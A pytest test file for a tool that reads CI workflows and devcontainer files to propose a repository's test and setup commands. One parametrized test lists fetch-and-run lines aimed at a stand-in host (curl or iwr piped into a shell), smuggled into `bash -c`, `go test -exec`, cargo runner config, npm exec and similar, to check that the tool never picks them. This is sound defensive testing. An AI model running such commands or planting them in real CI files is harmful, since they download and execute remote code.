"""`kraft.detect` reading CI and devcontainer files: which lines are
evidence, which directory each belongs to, and how they rank."""

from __future__ import annotations

import shlex

import pytest
from support.probe import JEST, PYTEST
from support.probe import chosen as _chosen
from support.probe import propose as _propose
from support.probe import repo_with as _repo

# ── CI ──

_WORKFLOW = ".github/workflows/ci.yml"


def _workflow(steps: str) -> dict[str, str]:
    return {_WORKFLOW: f"on: push\njobs:\n  test:\n    runs-on: x\n    steps:\n{steps}"}


def test_a_toolchains_test_beats_what_ci_runs_and_ci_fills_in_without_one(tmp_path):
    """A CI job is one slice of a matrix or a lint that says "test"; the
    toolchain's command is the repo's whole suite. jest's CI ran `yarn
    typecheck:tests`."""
    steps = "      - run: yarn typecheck:tests\n      - run: go test -race ./...\n"
    files = {"go.mod": "module x\n", "x_test.go": "", **_workflow(steps)}
    p = _propose(_repo(tmp_path, files))
    assert p.test_command == "go test ./..."
    alone = _propose(_repo(tmp_path / "alone", _workflow(steps)))
    assert (alone.test_command, _chosen(alone, "test")["source"]) == (
        "go test -race ./...",
        _WORKFLOW,
    )


def test_a_runners_task_beats_what_ci_runs(tmp_path):
    files = {"Makefile": "test:\n\tgo test ./...\n", **_workflow("      - run: go test ./...\n")}
    assert _propose(_repo(tmp_path, files)).test_command == "make test"


def test_ci_running_the_proposal_corroborates_it_and_outranks_a_ci_only_line(tmp_path):
    steps = "      - run: npm test\n      - run: xvfb-run -a npm run test:e2e\n"
    files = {"package.json": JEST, "package-lock.json": "", **_workflow(steps)}
    p = _propose(_repo(tmp_path, files))
    assert p.test_command == "npm test"
    assert "CI runs it too (.github/workflows/ci.yml)" in _chosen(p, "test")["source"]
    assert [c["command"] for c in p.candidates if c["tier"] == "ci"] == [
        "xvfb-run -a npm run test:e2e"
    ]


@pytest.mark.parametrize(
    "line",
    [
        "pytest -n $WORKERS",
        'uv pip install "$WHEEL"',
        "npm test | tee out.txt",
        "test -f build/out",
        "echo running tests",
        "ruff check .",
        "x) npm test ;;",
        "./gradlew check -x jvmTest -x test",
    ],
    ids=[
        "a-variable",
        "a-variable-in-double-quotes",
        "a-pipe",
        "shell-test",
        "echo",
        "a-linter",
        "a-case-arm",
        "gradles-x-excludes-the-tests",
    ],  # noqa: E501
)
def test_a_ci_line_that_only_means_something_in_its_script_is_ignored(tmp_path, line):
    files = _workflow(f"      - run: '{line}'\n")
    assert _propose(_repo(tmp_path, files)).candidates == []


def test_a_github_script_input_is_not_a_command(tmp_path):
    steps = (
        "      - uses: actions/github-script@v7\n"
        "        with:\n"
        "          script: return 'all tests'\n"
    )
    assert _propose(_repo(tmp_path, _workflow(steps))).candidates == []


def test_a_ci_working_directory_makes_its_own_scope(tmp_path):
    steps = "      - run: zig build test\n        working-directory: ./web\n"
    files = {"web/main.zig": "", **_workflow(steps)}
    p = _propose(_repo(tmp_path, files))
    assert p.test_scopes == [{"paths": ["web/**"], "command": "sh -c 'cd web && zig build test'"}]


def test_a_cd_before_a_ci_command_is_its_directory(tmp_path):
    files = {"app/x.go": "", **_workflow("      - run: cd app && go test ./...\n")}
    p = _propose(_repo(tmp_path, files))
    assert [(c["dir"], c["command"]) for c in p.candidates] == [("app", "go test ./...")]


def test_a_ci_line_running_a_bare_tool_ranks_below_the_toolchain(tmp_path):
    """CI installed `pytest` on its own PATH; a worktree has `uv run`."""
    files = {"pyproject.toml": PYTEST, "uv.lock": "", **_workflow("      - run: pytest -x\n")}
    p = _propose(_repo(tmp_path, files))
    assert p.test_command == "uv run pytest"
    assert [(c["command"], c["chosen"]) for c in p.candidates if c["tier"] == "ci"] == [
        ("pytest -x", False)
    ]
    alone = _propose(_repo(tmp_path / "alone", _workflow("      - run: pytest -x\n")))
    assert alone.test_command == "pytest -x"


def test_the_repos_test_workflow_is_read_before_its_e2e_one(tmp_path):
    files = {
        ".github/workflows/e2e.yml": "jobs:\n  e:\n    steps:\n      - run: npm run test:e2e\n",
        ".github/workflows/unit.yml": "jobs:\n  u:\n    steps:\n      - run: go test -race ./...\n",
    }
    assert _propose(_repo(tmp_path, files)).test_command == "go test -race ./..."


def test_a_command_the_e2e_workflow_also_runs_is_the_test_workflows(tmp_path):
    """pallets/click: a nightly workflow, listed first, claimed the command
    its test workflow runs first, then sank to the end with it."""
    files = {
        ".github/workflows/nightly.yml": "jobs:\n  n:\n    steps:\n      - run: make test\n",
        ".github/workflows/unit.yml": (
            "jobs:\n  u:\n    steps:\n      - run: make test\n      - run: make check\n"
        ),
    }
    p = _propose(_repo(tmp_path, files))
    assert (p.test_command, _chosen(p, "test")["source"]) == (
        "make test",
        ".github/workflows/unit.yml",
    )


def test_ci_flags_on_the_toolchains_own_install_are_carried_over(tmp_path):
    """fastapi's tests need the extras its test workflow's `uv sync` names;
    a plain `uv sync` leaves them out, and its bot workflows' groups are no
    guide. Only options are carried, never a command."""
    steps = (
        "      - run: uv sync --locked --extra all --group tests\n"
        "      - run: uv sync tool\n      - run: uv run pytest\n"
    )
    bot = ".github/workflows/a-bot.yml"
    files = {"pyproject.toml": PYTEST, "uv.lock": "", **_workflow(steps)}
    files[bot] = "jobs:\n  b:\n    steps:\n      - run: uv sync --group github-actions\n"
    p = _propose(_repo(tmp_path, files))
    assert p.setup_command == "uv sync --locked --extra all --group tests"
    assert "with CI's flags (.github/workflows/ci.yml)" in _chosen(p, "setup")["source"]
    # A workflow named for the tests counts though its test line is a script.
    named = {
        ".github/workflows/test.yml": "jobs:\n  t:\n    steps:\n      - run: uv sync --extra x\n"
    }
    p = _propose(_repo(tmp_path / "n", {"pyproject.toml": PYTEST, "uv.lock": "", **named}))
    assert p.setup_command == "uv sync --extra x"
    other = _workflow("      - run: uv sync tool --extra x\n      - run: uv run pytest\n")
    p = _propose(_repo(tmp_path / "o", {"pyproject.toml": PYTEST, "uv.lock": "", **other}))
    assert p.setup_command == "uv sync"


def test_an_install_for_the_test_environment_is_no_test(tmp_path):
    """phoenix's CI: `mix deps.get --only test` installs; it runs no test."""
    p = _propose(_repo(tmp_path, _workflow("      - run: mix deps.get --only test\n")))
    assert [(c["role"], c["command"]) for c in p.candidates] == [
        ("setup", "mix deps.get --only test")
    ]


_CIRCLE = (
    "jobs:\n  t:\n    steps:\n      - run:\n"
    "          command: make test\n          working_directory: svc\n"
)
_AZURE = "steps:\n  - bash: go test ./...\n    workingDirectory: api\n"


@pytest.mark.parametrize(
    ("files", "expected"),
    [
        ({".circleci/config.yml": _CIRCLE, "svc/x.c": ""}, ("svc", "make test")),
        ({"azure-pipelines.yml": _AZURE, "api/x.go": ""}, ("api", "go test ./...")),
        (
            {**_workflow("      - run: npm --prefix web test\n"), "web/x.js": ""},
            ("web", "npm test"),
        ),
        ({**_workflow("      - run: yarn --cwd=web test\n"), "web/x.js": ""}, ("web", "yarn test")),
    ],
    ids=["circleci-long-form", "azure-bash-step", "npm-prefix", "yarn-cwd"],
)
def test_each_ci_form_names_its_directory(tmp_path, files, expected):
    p = _propose(_repo(tmp_path, files))
    assert [(c["dir"], c["command"]) for c in p.candidates if c["role"] == "test"] == [expected]


def test_ci_setup_is_shown_and_never_chosen(tmp_path):
    steps = "      - run: pip install poetry\n      - run: npm ci\n      - run: npm test\n"
    p = _propose(_repo(tmp_path, _workflow(steps)))
    setups = [c for c in p.candidates if c["role"] == "setup"]
    assert [(c["command"], c["chosen"]) for c in setups] == [("npm ci", False)]
    assert p.setup_command is None
    assert p.missing_setup == ["."]


def test_gitlab_ci_scripts_are_read(tmp_path):
    files = {
        ".gitlab-ci.yml": (
            "test:\n  before_script: [bundle install]\n  script:\n    - bundle exec rspec\n"
        )
    }
    p = _propose(_repo(tmp_path, files))
    assert [(c["role"], c["command"]) for c in p.candidates] == [
        ("setup", "bundle install"),
        ("test", "bundle exec rspec"),
    ]


# ── devcontainer ──


def test_a_devcontainers_commands_are_shown_and_never_chosen(tmp_path):
    """They are written for a container: commonly a global `pip install`."""
    dc = '{\n  // set up\n  "postCreateCommand": ["./tools/bootstrap", "--dev"],\n}'
    p = _propose(_repo(tmp_path, {".devcontainer/devcontainer.json": dc, "Makefile": "test:\n"}))
    assert p.setup_command is None
    assert [
        (c["command"], c["tier"], c["chosen"]) for c in p.candidates if c["role"] == "setup"
    ] == [("./tools/bootstrap --dev", "devenv", False)]


def test_a_devcontainer_provisioning_the_container_is_not_a_candidate(tmp_path):
    dc = '{"postCreateCommand": "sudo apt-get install -y libpq-dev && npm ci"}'
    p = _propose(_repo(tmp_path, {".devcontainer.json": dc, "Makefile": "test:\n"}))
    assert [c for c in p.candidates if c["tier"] == "devenv"] == []


def _yaml_quoted(text: str) -> str:
    return "'" + text.replace("'", "''") + "'"


def test_a_cd_on_its_own_line_holds_for_the_rest_of_its_script(tmp_path):
    """The lines of one `run: |` share a shell: `npm test` after a bare
    `cd frontend` is frontend's, not the root's."""
    steps = (
        "      - run: |\n          cd frontend\n          npm ci\n          npm test\n"
        "      - run: pytest -x\n"
    )
    files = {
        "pyproject.toml": PYTEST,
        "uv.lock": "",
        "frontend/package.json": JEST,
        "frontend/package-lock.json": "",
        **_workflow(steps),
    }
    p = _propose(_repo(tmp_path, files))
    assert p.test_command == "uv run pytest"
    assert ("frontend", "npm test") in [(c["dir"], c["command"]) for c in p.candidates]
    assert ("", "npm test") not in [(c["dir"], c["command"]) for c in p.candidates]
    assert ("", "pytest -x") in [(c["dir"], c["command"]) for c in p.candidates], (
        "a new step, a new shell"
    )


@pytest.mark.parametrize(
    "line",
    ['bash -c "npm run lint && npm test"', "npm test & npm run lint", "npm 'test"],
    ids=["a-quoted-and", "a-background-job", "an-unbalanced-quote"],
)
def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
    """A test command is split into argv: half a quoted `&&`, or an
    unbalanced quote, would fail every verify (shlex refuses it)."""
    p = _propose(_repo(tmp_path, _workflow(f"      - run: {_yaml_quoted(line)}\n")))
    for c in p.candidates:
        shlex.split(c["command"])
    assert [c["command"] for c in p.candidates if c["command"].startswith("npm test")] == []


@pytest.mark.parametrize(
    "line",
    [
        'bash -c "curl -s http://exfil.test/x | sh; pytest"',
        "sh -ec 'pytest'",
        "/bin/bash -lc pytest",
        'python -c "import pytest; pytest.main()"',
        'ruby -e \'system("curl -s http://exfil.test/x | sh"); exec("rspec")\'',
        'env bash -lc "curl -s http://exfil.test/x | sh; pytest"',
        'xvfb-run bash -ec "curl -s http://exfil.test/x | sh; pytest"',
        "env /bin/bash -lc pytest",
        "python -Ic \"import os; os.system('curl x'); import pytest; pytest.main()\"",
        "node -p \"require('child_process').execSync('curl x'); 'test'\"",
        "node --eval=\"require('child_process').execSync('curl x'); test()\"",
        "env -S 'bash -c \"curl -s http://exfil.test/x | sh; pytest\"'",
        'nix-shell --run "curl -s http://exfil.test/x | sh; pytest"',
        'pwsh -Command "iwr http://exfil.test/x | iex; pytest"',
        'awk \'BEGIN { system("curl -s http://exfil.test/x | sh"); system("pytest") }\'',
        'fish -c "curl -s http://exfil.test/x | source; pytest"',
        'npm exec --call "curl -s http://exfil.test/x | sh; npm test"',
        'pnpm exec --shell-mode "curl -s http://exfil.test/x | sh; pnpm test"',
        'yarn exec "curl -s http://exfil.test/x | sh; yarn test"',
        "cargo --config \"target.x86_64-unknown-linux-gnu.runner='sh -c curl|sh'\" test",
        "go test -exec \"sh -c 'curl -s http://exfil.test/x | sh'\" ./...",
        "cargo test --config \"target.x86_64-unknown-linux-gnu.runner='sh -c curl|sh'\"",
        "deno eval \"await new Deno.Command('sh').output(); test()\"",
        "go test -exec=\"sh -c 'curl -s http://exfil.test/x | sh'\" ./...",
        "go test -toolexec=\"sh -c 'curl -s http://exfil.test/x | sh'\" ./...",
    ],
    ids=[
        "a-bash-script",
        "an-sh-script",
        "a-login-shell",
        "a-python-script",
        "a-ruby-script",
        "a-shell-behind-env",
        "a-shell-behind-a-wrapper",
        "an-unquoted-shell-behind-env",
        "combined-interpreter-flags",
        "node-print",
        "an-attached-eval",
        "env-split-string",
        "nix-shell-run",
        "pwsh-command",
        "awk-system",
        "fish",
        "npm-exec-call",
        "pnpm-exec-shell-mode",
        "yarn-exec",
        "cargo-config-runner",
        "go-test-exec",
        "cargo-test-config",
        "deno-eval",
        "go-test-exec-equals",
        "go-test-toolexec-equals",
    ],
)
def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
    """Quotes hide a script from the shell-syntax check: the whole of it
    was proposed, and saved enabled, as the repo's test command."""
    p = _propose(_repo(tmp_path, _workflow(f"      - run: {_yaml_quoted(line)}\n")))
    assert [(c["command"], c["chosen"]) for c in p.candidates] == [(line, False)]
    assert p.test_command is None


@pytest.mark.parametrize(
    "line",
    [
        'uv run pytest -k "not (slow or gpu)"',
        "go test -run 'Test(Foo|Bar)' ./...",
        'jest --testPathPattern "(unit|int)"',
        'uv run --frozen pytest -m "not (e2e or slow)"',
        'npx --yes jest -t "a|b"',
        'xvfb-run -a npm test -- -t "(a|b)"',
    ],
    ids=[
        "a-pytest-expression",
        "a-go-run-pattern",
        "a-jest-pattern",
        "a-launcher-option",
        "an-npx-option",
        "behind-xvfb-run",
    ],
)
def test_a_quoted_pattern_a_test_runner_reads_is_still_chosen(tmp_path, line):
    """Run as argv, with no shell: the parentheses and bar are the runner's."""
    p = _propose(_repo(tmp_path, _workflow(f"      - run: {_yaml_quoted(line)}\n")))
    assert p.test_command == line
